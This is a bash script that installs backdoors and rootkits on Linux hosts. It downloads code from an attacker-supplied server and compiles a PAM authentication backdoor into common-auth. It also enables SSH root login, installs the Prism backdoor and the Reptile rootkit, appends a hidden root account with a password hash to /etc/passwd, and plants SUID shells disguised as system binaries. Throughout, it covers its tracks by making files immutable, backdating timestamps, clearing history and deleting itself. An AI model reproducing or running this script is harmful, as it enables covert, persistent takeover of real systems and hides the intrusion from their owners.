#!/bin/bash

set +e
set +o history

CWD=$(pwd)

# Validate input
if [ $# -ne 1 ]; then
    echo "Usage: $0 <server_ip:port>"
    exit 1
fi
SERV_IP_PORT="$1"

# Check for wget or curl
FETCH_CMD="wget"
if ! command -v wget &>/dev/null; then
    FETCH_CMD="curl -O"
fi

# Determine package manager
PKG_MANAGER=""
if command -v apt &>/dev/null; then
    PKG_MANAGER="apt install -y"
    $PKG_MANAGER libpam0g-dev gcc make build-essential
    apt update
elif command -v yum &>/dev/null; then
    PKG_MANAGER="yum install -y"
    yum update
    $PKG_MANAGER pam-devel gcc
elif command -v dnf &>/dev/null; then
    PKG_MANAGER="dnf install -y"
    dnf update
    $PKG_MANAGER pam-devel gcc
elif command -v pacman &>/dev/null; then
    PKG_MANAGER="pacman -S --noconfirm"
else
    exit 1
fi

# Create directories
mkdir -p /var/opt/bds /opt/bds
cd /var/opt/bds

# Backdoor PAM
$FETCH_CMD $SERV_IP_PORT/pam_backdoor.c

gcc -fPIC -shared -o bds_pam.so pam_backdoor.c
mv bds_pam.so /etc/pam.d

# Modify PAM configuration
PAM_SO_PATH="/etc/pam.d/bds_pam.so"
PAM_FILE="/etc/pam.d/common-auth"
if ! grep -qF "$PAM_SO_PATH" "$PAM_FILE"; then
    awk -v newline="auth    sufficient                      $PAM_SO_PATH" '
        NF > 0 && $1 !~ /^#/ && !done {
            print newline;
            $0 = $0 " use_first_pass";
            done = 1;
        }
        { print }
    ' "$PAM_FILE" > /tmp/.pam_temp && mv /tmp/.pam_temp "$PAM_FILE"
fi

touch -d "Jun 24 2022" "/etc/pam.d/common-auth"
chattr +i /etc/pam.d/common-auth
chattr +i /etc/pam.d/bds_pam.so

# Enable root login
if grep -q '^PermitRootLogin' /etc/ssh/sshd_config; then
    sed -i '/PermitRootLogin/c\PermitRootLogin yes' /etc/ssh/sshd_config
else
    echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config
fi
systemctl restart sshd 2>/dev/null
systemctl restart ssh 2>/dev/null

# Determine kernel version
KERNEL_MAJOR=$(uname -r | cut -d'.' -f1)

# Install Prism based on kernel version (BDS kit comes with a backdoor)
if [ "$KERNEL_MAJOR" -le 4 ]; then
    $FETCH_CMD $SERV_IP_PORT/prism.tar.gz 
    tar -xvf prism.tar.gz
    rm prism.tar.gz
    cd prism
    $PKG_MANAGER make gcc build-essential
    gcc -DDETACH -m64 -Wall -s -o bds_sys prism.c || mv bds_sys /opt/bds/
    mv bds_sys /opt/bds/
    /opt/bds/bds_sys
    cat > /etc/systemd/system/bds_sys.service <<EOF
[Unit]
Description=BDS System Service
After=network-online.target
Wants=network-online.target

[Service]
Type=oneshot
ExecStart=/opt/bds/bds_sys
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
EOF
    cd /var/opt/bds
    systemctl enable bds_sys.service
    systemctl start bds_sys.service
fi

# Create systemd services

if [ "$KERNEL_MAJOR" -le 4 ]; then
    cat > /etc/systemd/system/bds_stat.service <<EOF
[Unit]
Description=BDS Status Service
After=network.target

[Service]
Type=oneshot
ExecStart=/lib/udev/bds
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
EOF
    systemctl enable bds_stat.service
    systemctl start bds_stat.service
fi

# Set SUID bits
chmod u+s $(which ip) $(which chroot)
cp $(which dash) /usr/lib/openssh/ssh_keygen
chmod u+s /usr/lib/openssh/ssh_keygen

# Install net-tools
$PKG_MANAGER net-tools

# Install rootkit
if [ "$KERNEL_MAJOR" -le 4 ]; then
    $FETCH_CMD $SERV_IP_PORT/reptile.tar.gz
    tar -xvf reptile.tar.gz
    rm reptile.tar.gz
    cd bds_4
    $PKG_MANAGER gcc make build-essential
    make defconfig
    make
    make install
    cd /var/opt/bds
    echo '#<reptile>' >> /etc/passwd
    echo 'tty0:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash' >> /etc/passwd
    echo '#</reptile>' >> /etc/passwd
else
    sysctl kernel.ftrace_enabled=1
    $FETCH_CMD $SERV_IP_PORT/bds.tar.gz
    tar -xvf bds.tar.gz
    rm bds.tar.gz
    cd bds
    ./install.sh
    cd /var/opt/bds
fi

# Change file dates
touch -d "Aug 2 2018" "/etc/passwd"
touch -d "May 10 2019" "/etc/ssh/sshd_config"
touch -d "Jun 14 2018" "/etc/pam.d"
touch -d "Aug 2 2018" "/opt"
touch -d "Aug 2 2018" "/var/opt"
touch -d "Dec 11 2019" "/usr/lib/openssh/ssh_keygen"
touch -d "Dec 21 2019" "$(which ip)"
touch -d "Dec 29 2019" "$(which chroot)"

# Clear history
history -c
rm -f $HISTFILE

# Delete script
cd "$CWD"
rm -f "$0"